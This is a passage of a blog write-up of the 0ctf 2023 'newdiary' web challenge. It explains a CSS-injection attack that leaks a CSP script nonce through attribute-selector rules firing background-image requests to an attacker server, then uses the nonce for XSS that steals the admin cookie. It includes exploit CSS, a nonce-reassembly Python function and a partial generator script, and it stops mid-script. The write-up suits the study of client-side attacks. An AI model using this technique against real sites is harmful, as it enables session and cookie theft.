<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta
    name="description"
    content="Personal blog about Cybersec &amp; other things."
  />
  
    
      <title>One-shot CSS Injection - newdiary - 0ctf 2023 | Salvatore Abello&#39;s Blog</title>
    
  
  <link rel="stylesheet" href="/css/reset.css"/>
  <link rel="stylesheet" href="/css/font.css"/>
  <link rel="stylesheet" href="/css/smigle.css"/>
  
  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
  <link rel="manifest" href="/site.webmanifest">
  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
  <meta name="msapplication-TileColor" content="#da532c">
  <meta name="theme-color" content="#ffffff">
</head>

  <body>
    <div id="root">
      <header>
  <div id="brand">
    <a class="icon-link" href="https://salvatore-abello.github.io/">
      <img
        class="icon"
        src="/images/65adf8e914bdc50b5f5f2e8b91b68cb1.png"
      />
    </a>
    <div class="text">
      <a href="https://salvatore-abello.github.io/"><h1>Salvatore Abello&#39;s Blog</h1></a>
      <h3>Hacking &amp; other stuff</h3>
    </div>
  </div>
  <nav>
    
      
        
        <a href="/"><b>Home</b></a>
      
         | 
        <a href="/whoami/"><b>Whoami</b></a>
      
         | 
        <a href="/achievements/"><b>Achievements</b></a>
      
         | 
        <a href="/posts/"><b>Posts</b></a>
      
         | 
        <a href="/cves/"><b>CVEs</b></a>
      
    
  </nav>
  <hr />
</header>

      <div id="content">
        
  <main>
    <article>
      <h1 class="title">One-shot CSS Injection - newdiary - 0ctf 2023</h1>
      
      <div class="post-meta">
  <strong>
    <span>Posted on</span>
    <time>2023-12-12 00:00:00</time>
    
    
  </strong>
  <span> • 1900 words</span>
  <span> • 9 minute read</span>
  
  
    <div>
      <span>Tags:</span>
      
        <a href="/tags/cybersec">Cybersec</a>, 
        <a href="/tags/writeup">Writeup</a>, 
        <a href="/tags/web">web</a>, 
        <a href="/tags/client-side">client-side</a>, 
        <a href="/tags/css-injection">css-injection</a>
    </div>
  
</div>

      <div class="content"><p>This year, for the first time, I partecipated to <strong>0ctf</strong> with <code>mhackeroni</code>.
Me, <code>@Ricy</code> and <code>@Alemmi</code> solved this challenge, we spent many hours in order to find a working exploit, but it was worth it.</p>
<h2 id="index">Index</h2>
<ul>
<li><a href="#new-diary-14-solves">New Diary (14 solves)</a>
<ul>
<li><a href="#index">Index</a></li>
<li><a href="#overview">Overview</a></li>
<li><a href="#exploit-idea">Exploit idea</a></li>
<li><a href="#leaking-the-nonce">Leaking the nonce</a></li>
<li><a href="#sources">Sources</a>
<ul>
<li><a href="#css-exploit">CSS exploit</a></li>
<li><a href="#first-note-id-0">First note (ID 0)</a></li>
<li><a href="#second-note-id-1">Second Note (ID 1)</a></li>
<li><a href="#third-note-id-2">Third Note (ID 2)</a></li>
<li><a href="#final-exploit">Final exploit</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="overview">Overview</h2>
<p>This is a whitebox web challenge and it&rsquo;s client-side, we need to steal the admin cookie with the flag inside, so we have to do XSS.
We&rsquo;re able to:</p>
<ul>
<li>Create new notes with a <code>title</code> (30 chars max) and <code>content</code> (256 chars max);</li>
<li>Share notes with everyone;</li>
<li>View notes from every user (as long as they shared it);</li>
<li>Report to an admin a note (ID and username is needed).</li>
</ul>
<p>The shared notes are loaded on client-side:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">load</span> <span style="color:#f92672">=</span> () =&gt; {
</span></span><span style="display:flex;"><span>    document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;title&#34;</span>).<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;content&#34;</span>).<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">param</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URLSearchParams</span>(<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">hash</span>.<span style="color:#a6e22e">slice</span>(<span style="color:#ae81ff">1</span>));
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">id</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">param</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;id&#39;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">param</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;username&#39;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">id</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#e6db74">/^[0-9a-f]+$/</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">id</span>)) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">username</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`/share/read/</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">id</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">data</span> =&gt; <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">json</span>()).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">data</span> =&gt; {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">title</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#39;p&#39;</span>);
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">title</span>.<span style="color:#a6e22e">innerText</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">title</span>;
</span></span><span style="display:flex;"><span>                document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;title&#34;</span>).<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">title</span>);
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">content</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#39;p&#39;</span>);
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">content</span>.<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">content</span>;
</span></span><span style="display:flex;"><span>                document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;content&#34;</span>).<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">content</span>);
</span></span><span style="display:flex;"><span>            })
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`/share/read/</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">id</span><span style="color:#e6db74">}</span><span style="color:#e6db74">?username=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">username</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">data</span> =&gt; <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">json</span>()).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">data</span> =&gt; {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">title</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#39;p&#39;</span>);
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">title</span>.<span style="color:#a6e22e">innerText</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">title</span>;
</span></span><span style="display:flex;"><span>                document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;title&#34;</span>).<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">title</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">content</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#39;p&#39;</span>);
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">content</span>.<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">content</span>;
</span></span><span style="display:flex;"><span>                document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;content&#34;</span>).<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">content</span>);
</span></span><span style="display:flex;"><span>            })
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;report&#34;</span>).<span style="color:#a6e22e">href</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`/report?id=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">id</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;username=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">username</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    window.<span style="color:#a6e22e">removeEventListener</span>(<span style="color:#e6db74">&#39;hashchange&#39;</span>, <span style="color:#a6e22e">load</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">load</span>();
</span></span><span style="display:flex;"><span>window.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;hashchange&#39;</span>, <span style="color:#a6e22e">load</span>);
</span></span></code></pre></div><p>We can clearly see that:</p>
<ul>
<li>Since <code>document.addEventListener('hashchange', load)</code> is used, we can actually load more than one post on the same request, by changing only the hash part <code>#id=1&amp;username=asd</code> we do not make reload the page, keeping the same nonce. We can change hash only once, since the event listener will be removed later (otherwise the exploit could have been a lot easier).</li>
<li>we can write every HTML tag we want since <code>content.innerHTML</code> is used.</li>
</ul>
<p>So that&rsquo;s it&hellip; Right? We can just execute any js code we want and then steal the cookie!
Of course not, if we read more carefully <code>read_share.html</code> we notice there&rsquo;s a meta tag which defines the CSP (Content Security Policy):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">http-equiv</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Content-Security-Policy&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;script-src &#39;nonce-&lt;%= nonce %&gt;&#39;; frame-src &#39;none&#39;; object-src &#39;none&#39;; base-uri &#39;self&#39;; style-src &#39;unsafe-inline&#39; https://unpkg.com&#34;</span>&gt;
</span></span></code></pre></div><p>So we can&rsquo;t execute any js code as long as they don&rsquo;t have the right nonce, which is generated randomly and it changes every time we make a request. We can see how the nonce is generated in <code>app.js</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">genNonce</span> <span style="color:#f92672">=</span> () =&gt;
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;_&#34;</span>
</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">repeat</span>(<span style="color:#ae81ff">32</span>)
</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">/_/g</span>, () =&gt;
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;abcdefghijklmnopqrstuvwxyz0123456789&#34;</span>.<span style="color:#a6e22e">charAt</span>(<span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">randomInt</span>(<span style="color:#ae81ff">36</span>))
</span></span><span style="display:flex;"><span>    );
</span></span></code></pre></div><p>Thus, we have <code>36^32</code> possible nonces, which is a lot. We can&rsquo;t bruteforce it, so we need to find another way.</p>
<p>However, due to the <code>unsafe-inline</code> CSP policy, we&rsquo;re able to insert CSS by using the <code>&lt;style&gt;</code> tag and by uploading to <code>npm</code> (the files are taken by <code>unpkg.com</code>)</p>
<p>By doing a quick research it&rsquo;s clear that we need to steal the nonce using CSS.</p>
<p><strong>Note:</strong> It&rsquo;s possible to leak the nonce using CSS because it&rsquo;s inside a meta tag, otherwise it wouldn&rsquo;t be possibile.</p>
<h2 id="exploit-idea">Exploit idea</h2>
<p>The exploit would be something similar to:</p>
<ol>
<li>Upload to <code>npm</code> a css file <code>leak.css</code> whose content is the exploit which will leak the nonce (I&rsquo;m going to talk about this later).</li>
<li>Create a post (ID 0) with a <code>meta</code> tag, which is needed to redirect the admin to an HTML page controlled by us.</li>
<li>Create a post (ID 1) where we import the <code>leak.css</code> and where the nonce will be stolen.</li>
<li>Report the meta redirect post (ID 0) to the admin, so he will be redirected to our page, where we can make him load the post where the <code>leak.css</code> style is imported (ID 1)</li>
<li>Finally, on the fly, when we have leaked the nonce, we create the last post (ID 2) where we can execute arbitrary js code with a nonce script, we can make the bot load the post (ID 2) where the XSS is executed, by changing the hash part of the url.</li>
<li>Profit.</li>
</ol>
<p>Main issue is, though, to understand how to leak the nonce.</p>
<h2 id="leaking-the-nonce">Leaking the nonce</h2>
<p>The first idea that came into our mind is using the following css rules in order to leak the nonce:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">body</span>:<span style="color:#a6e22e">has</span><span style="color:#f92672">(</span><span style="color:#f92672">script</span><span style="color:#f92672">[</span><span style="color:#f92672">nonce</span><span style="color:#f92672">^=</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">])</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">background</span>: url(<span style="color:#e6db74">...</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">body</span>:<span style="color:#a6e22e">has</span><span style="color:#f92672">(</span><span style="color:#f92672">script</span><span style="color:#f92672">[</span><span style="color:#f92672">nonce</span><span style="color:#f92672">^=</span><span style="color:#e6db74">&#34;b&#34;</span><span style="color:#f92672">])</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">background</span>: url(<span style="color:#e6db74">...</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">body</span>:<span style="color:#a6e22e">has</span><span style="color:#f92672">(</span><span style="color:#f92672">script</span><span style="color:#f92672">[</span><span style="color:#f92672">nonce</span><span style="color:#f92672">^=</span><span style="color:#e6db74">&#34;c&#34;</span><span style="color:#f92672">])</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">background</span>: url(<span style="color:#e6db74">...</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[...]</span>
</span></span></code></pre></div><p>When a request is sent to our server, we know which char is right, and then we would upload a new css file to npm in order to leak the following char.</p>
<p>We quickly realized it&rsquo;s not possible due to multiple reasons:</p>
<ul>
<li>the uploading process is too slow,</li>
<li>we cannot import dynamically css since we cannot reload the page, leading to losing the nonce</li>
<li>we can only load another post once.</li>
</ul>
<p>so we moved on.</p>
<p>An idea which sounded great came into my mind the next day: we can leak the whole nonce in parts by using the <code>*=</code> operator in CSS.</p>
<p>Example:
Let&rsquo;s say our nonce is <code>testo</code>, if we can leak substrings of the nonce, then to our server we might receive these requests:</p>
<p><code>?x=tes</code>
<code>?x=est</code>
<code>?x=sto</code></p>
<p>Then, since some letters overlap, we&rsquo;re able to recover the whole nonce.</p>
<p>We tried to leak some characters using a payload similar to the one above:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">body</span>:<span style="color:#a6e22e">has</span><span style="color:#f92672">(</span><span style="color:#f92672">script</span><span style="color:#f92672">[</span><span style="color:#f92672">nonce</span><span style="color:#f92672">*=</span><span style="color:#e6db74">&#34;aaa&#34;</span><span style="color:#f92672">])</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">background</span>: url(<span style="color:#e6db74">...</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">body</span>:<span style="color:#a6e22e">has</span><span style="color:#f92672">(</span><span style="color:#f92672">script</span><span style="color:#f92672">[</span><span style="color:#f92672">nonce</span><span style="color:#f92672">*=</span><span style="color:#e6db74">&#34;aab&#34;</span><span style="color:#f92672">])</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">background</span>: url(<span style="color:#e6db74">...</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">body</span>:<span style="color:#a6e22e">has</span><span style="color:#f92672">(</span><span style="color:#f92672">script</span><span style="color:#f92672">[</span><span style="color:#f92672">nonce</span><span style="color:#f92672">*=</span><span style="color:#e6db74">&#34;aac&#34;</span><span style="color:#f92672">])</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">background</span>: url(<span style="color:#e6db74">...</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[...]</span>
</span></span></code></pre></div><p>We realized that something is not working, only the last matched substring (in this case it would be <code>aac</code>) is being sent to our server.</p>
<p>We had no idea why it didn&rsquo;t work.</p>
<blockquote>
<p>Further researches led us to understand that in CSS, when you have multiple selectors targeting the same element (or set of elements) with conflicting styles, the style that is applied is determined by the specificity and order of the rules. If a later rule has the same or higher specificity as an earlier rule, it will override the earlier rule. If the specificity is the same, the rule declared later in the stylesheet takes precedence.</p>
</blockquote>
<p>Then, after trying many times to find a way to send more requests, we tried to apply more than one background to a tag and&hellip; It worked!!!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span>:<span style="color:#a6e22e">has</span><span style="color:#f92672">(</span><span style="color:#f92672">script</span><span style="color:#f92672">[</span><span style="color:#f92672">nonce</span><span style="color:#f92672">*=</span><span style="color:#e6db74">&#34;aaa&#34;</span><span style="color:#f92672">])</span>{--tosend-aaa: url(<span style="color:#e6db74">...?x=aaa</span>);}
</span></span><span style="display:flex;"><span>:<span style="color:#a6e22e">has</span><span style="color:#f92672">(</span><span style="color:#f92672">script</span><span style="color:#f92672">[</span><span style="color:#f92672">nonce</span><span style="color:#f92672">*=</span><span style="color:#e6db74">&#34;aab&#34;</span><span style="color:#f92672">])</span>{--tosend-aab: url(<span style="color:#e6db74">...?x=aab</span>);}
</span></span><span style="display:flex;"><span>:<span style="color:#a6e22e">has</span><span style="color:#f92672">(</span><span style="color:#f92672">script</span><span style="color:#f92672">[</span><span style="color:#f92672">nonce</span><span style="color:#f92672">*=</span><span style="color:#e6db74">&#34;aac&#34;</span><span style="color:#f92672">])</span>{--tosend-aac: url(<span style="color:#e6db74">...?x=aac</span>);}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[...]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">input</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">background</span>: <span style="color:#a6e22e">var</span>(<span style="color:#f92672">--</span>tosend<span style="color:#f92672">-</span>aaa, <span style="color:#66d9ef">none</span>),
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">var</span>(<span style="color:#f92672">--</span>tosend<span style="color:#f92672">-</span>aab, <span style="color:#66d9ef">none</span>),
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">var</span>(<span style="color:#f92672">--</span>tosend<span style="color:#f92672">-</span>aac, <span style="color:#66d9ef">none</span>),
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">var</span>(<span style="color:#f92672">--</span>tosend<span style="color:#f92672">-</span>aad, <span style="color:#66d9ef">none</span>),
</span></span><span style="display:flex;"><span>    [<span style="color:#f92672">...</span>]
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>So we&rsquo;re going to receive only the correct substrings.
It&rsquo;s possible to recover the nonce in many ways, the one we used is the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">retrieveNonce</span>(nonce_substr<span style="color:#f92672">=</span>nonce_substr, force<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># find the beginning of the nonce (there is no match for start)</span>
</span></span><span style="display:flex;"><span>    new_substr <span style="color:#f92672">=</span> list(nonce_substr)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (len(new_substr) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">30</span> <span style="color:#f92672">and</span> <span style="color:#f92672">not</span> force):
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;different length of new_substr [</span><span style="color:#e6db74">{</span>len(new_substr)<span style="color:#e6db74">}</span><span style="color:#e6db74">] - aborting&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    backup <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    nonce <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    remove_i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(new_substr)):
</span></span><span style="display:flex;"><span>        start_i <span style="color:#f92672">=</span> new_substr[i][<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">2</span>]
</span></span><span style="display:flex;"><span>        left <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(len(new_substr)):
</span></span><span style="display:flex;"><span>            end_j <span style="color:#f92672">=</span> new_substr[j][<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>:]
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> i <span style="color:#f92672">!=</span> j:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> start_i <span style="color:#f92672">==</span> end_j:
</span></span><span style="display:flex;"><span>                    left <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> left <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># beginning</span>
</span></span><span style="display:flex;"><span>            remove_i <span style="color:#f92672">=</span> i
</span></span><span style="display:flex;"><span>            nonce <span style="color:#f92672">=</span> new_substr[i]
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (len(nonce) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>):
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;no beginning - aborting&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (len(nonce) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">32</span>):
</span></span><span style="display:flex;"><span>        new_substr <span style="color:#f92672">=</span> new_substr[<span style="color:#ae81ff">0</span>:remove_i] <span style="color:#f92672">+</span> new_substr[remove_i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>:]
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># print(&#34;new substr: &#34; + str(new_substr))</span>
</span></span><span style="display:flex;"><span>        found <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(new_substr)):
</span></span><span style="display:flex;"><span>            start_i <span style="color:#f92672">=</span> new_substr[i][<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">2</span>]
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (nonce[<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>:] <span style="color:#f92672">==</span> start_i):
</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># print(&#34;found: &#34; + start_i)</span>
</span></span><span style="display:flex;"><span>                found <span style="color:#f92672">+=</span> [i]
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (len(found) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># start over from latest backup</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (len(backup) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>):
</span></span><span style="display:flex;"><span>                nonce <span style="color:#f92672">=</span> backup[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>                found <span style="color:#f92672">=</span> backup[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>                new_substr <span style="color:#f92672">=</span> backup[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">2</span>]
</span></span><span style="display:flex;"><span>                backup <span style="color:#f92672">=</span> backup[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">&#34;no backup - aborting&#34;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (len(found) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (len(found) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">&#34;found more than one: &#34;</span> <span style="color:#f92672">+</span> str(found))
</span></span><span style="display:flex;"><span>                backup <span style="color:#f92672">+=</span> [[nonce, found[<span style="color:#ae81ff">1</span>:], new_substr]]
</span></span><span style="display:flex;"><span>            remove_i <span style="color:#f92672">=</span> found[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>            nonce <span style="color:#f92672">+=</span> new_substr[remove_i][<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># input(&#34;nonce: &#34; + nonce)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> nonce
</span></span></code></pre></div><p>We noticed that the tab crashes while loading that css, but the requests are sent to our server anyway.</p>
<h2 id="sources">Sources</h2>
<h3 id="css-exploit">CSS exploit</h3>
<p>This is the script used in order to generate the CSS file:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> itertools
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>charset <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;abcdefghijklmnopqrstuvwxyz0123456789&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>perms <span style="color:#f92672">=</span> list(map(<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join, itertools<span style="color:#f92672">.</span>product(charset, repeat<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)))
